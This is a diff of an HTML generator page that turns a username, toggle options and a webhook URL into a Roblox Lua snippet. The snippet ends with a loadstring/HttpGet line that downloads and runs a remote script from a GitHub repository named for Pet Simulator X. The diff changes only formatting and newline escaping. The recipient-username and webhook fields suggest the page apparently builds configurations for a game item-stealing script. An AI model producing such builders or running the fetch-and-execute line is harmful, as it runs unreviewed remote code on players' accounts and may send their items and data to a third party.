@@ -40,26 +40,27 @@
     <button onclick="copyToClipboard()">Copy to Clipboard</button>
   </div>
 
-  <script>
+<script>
     function generateOutput() {
-      var username = document.getElementById("username").value;
-      var loadingscreen = document.getElementById("loadingscreen").checked;
-      var farmui = document.getElementById("farmui").checked;
-      var webhook = document.getElementById("webhook").value;
-      var outputString = 'Username = "' + username + '"\\n' +
-                         'loadingscreen = ' + loadingscreen + ' \\n' +
-                         'farmui = ' + farmui + '\\n' +
-                         'webhook = "' + webhook + '"\\n' +
-                         'loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/pets9.lua"))()';
-      document.getElementById("output").value = outputString;
-      hljs.highlightAll();
+        var username = document.getElementById("username").value;
+        var loadingscreen = document.getElementById("loadingscreen").checked;
+        var farmui = document.getElementById("farmui").checked;
+        var webhook = document.getElementById("webhook").value;
+        var outputString = 'Username = "' + username + '"\n' + // Use actual line breaks
+                           'loadingscreen = ' + loadingscreen + ' \n' +
+                           'farmui = ' + farmui + '\n' +
+                           'webhook = "' + webhook + '"\n' +
+                           'loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/pets9.lua"))()';
+        document.getElementById("output").value = outputString;
+        hljs.highlightAll();
     }
 
     function copyToClipboard() {
-      var copyText = document.getElementById("output");
-      copyText.select();
-      document.execCommand("copy");
+        var copyText = document.getElementById("output");
+        copyText.select();
+        document.execCommand("copy");
     }
-  </script>
+</script>
+
 </body>
 </html>
